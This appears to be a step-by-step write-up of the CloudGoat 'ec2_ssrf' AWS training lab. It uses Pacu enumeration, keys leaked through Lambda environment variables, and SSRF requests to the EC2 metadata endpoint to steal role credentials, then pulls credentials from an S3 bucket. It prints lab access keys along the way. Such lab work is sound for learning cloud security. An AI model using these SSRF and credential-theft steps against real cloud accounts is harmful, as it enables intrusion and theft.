Goal - Invoke the "cg-lambda-CloudGoat_ID" Lambda function.
```zsh
cloudgoat config aws
#cloudgoat

cloudgoat config whitelist --auto

cloudgoat create ec2_ssrf
#access_key_id_solus
#secret_key_solus

awc configure --profile solus
#setup access_key_id and secret_key
aws sts get-caller-identity --profile solus
#verify

aws iam get-account-summary --profile solus
#access denied

aws iam get-user --profile solus
#access denied
```

Enumerating IAM and lambda
```zsh
aws s3 ls --profile solus
pacu
ec2_ssrf #session name
import_keys solus

run iam__enum_permissions
#0 confirmed/unconfirmed for user solus/roles/users, indicating we dont have iam permissions

run iam__enum_users_roles_policies_groups
#nothing
run ec2__enum
#nothing

run lambda__enum
#asks to check for all regions, proceed with yes. Most of them nothing except
[lambda__enum] Starting region us-east-1...
[lambda__enum]   Enumerating data for cg-lambda-cgid0rdbj63g3p
	[+] Secret (ENV): EC2_ACCESS_KEY_ID= AKIAT4IZGLWOCFTSKQOL
	[+] Secret (ENV): EC2_SECRET_KEY_ID= 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

set_regions us-east-1

run lambda__enum
data lambda
```

```zsh
#set region to us-east-1
aws lambda list-functions --profile solus

#Now, in pacu, add the new creds under a new profile, lamb
set_keys
[profile alias] > lamb
[access_key_id]
[secret_key]

export_keys
aws s3 ls --profile lam

run iam__enum_permissions
run iam__enum_users_roles_policies_groups
#nothing

run ec2__enum
#multiple hits, including a public ip
data ec2

jq ".Instances[] | .PublicIpAddress" ec2
#to get the actual IP, instead of scrolling through the data
```

Visit the ip, and we see a webpage hosted, that sends requests to url. If we're able to pass the aws metadata endpoint, we can find out more things.
Every EC2 instance has access to internal aws metadata by calling a specific endpoint from within the instance. The metadata contains information and credentials used by the instance. We can use those credentials to possibly escalate our privileges

To query the metadata service we need the ec2 instance id. We can obtain the instance id by simply omitting it from the URL below and allowing the website to tell us. Alternatively, we could find the instance-id in the service data returned from Pacu. In this case, we will use the metadata service to find the instance-id.
```http
http://98.86.174.210/?url=http://169.254.169.254/latest/meta-data
http://98.86.174.210/?url=http://169.254.169.254/latest/meta-data/instance-id

http://98.86.174.210/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials
--get the cg-ec2-role id
http://98.86.174.210/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid0rdbj63g3p
```
This gives us access key id, secret key, and an absurdly long token

```zsh
aws configure --profile seth
access_key_id
secret key
token

#in pacu
import_keys seth
aws sts get-caller-identity --profile seth
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
run ec2__enum
run lambda__enum
```

```zsh
aws s3 ls --profile seth #(cg-ec2-role)
#2026-10-13 09:48:38 cg-secret-s3-bucket-cgid0rdbj63g3p
aws s3 ls --profile seth s3://cg-secret-s3-bucket-cgid0rdbj63g3p
#PRE aws/ -> ends with '/', means dir. needs recursive listing

aws s3 ls --profile seth s3://cg-secret-s3-bucket-cgid0rdbj63g3p --recursive
#2026-10-13 09:48:44        135 aws/credentials

#now, copy the creds to cur dir
aws s3 cp --profile seth s3://cg-secret-s3-bucket-cgid0rdbj63g3p/aws/credentials .

cat credentials
```
Setup profile for new creds, call it Rogan
```zsh
aws configure --profile rogan #(shephard)
aws sts get-caller-identity --profile rogan
aws s3 ls --profile

#pacu
import_keys rogan
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
run ec2__enum
#nothing

run lambda__enum
#hit, same from earlier
data lambda
"FunctionName": "cg-lambda-cgid0rdbj63g3p"
"Description": "Invoke this Lambda function for the win!"
```
Looks like this is the function we need to invoke.
So we re-list the lambda functions, 
```zsh
aws lambda list-functions --profile rogan
aws lambda invoke --function-name cg-lambda-cgid0rdbj63g3p
output_from_lambda.txt --profile rogan

aws lambda get-policy --function-name cg-lambda-cgid0rdbj63g3p
cat output_from_lambda.txt
#"You win!"

cloudgoat destroy ec2_ssrf
```
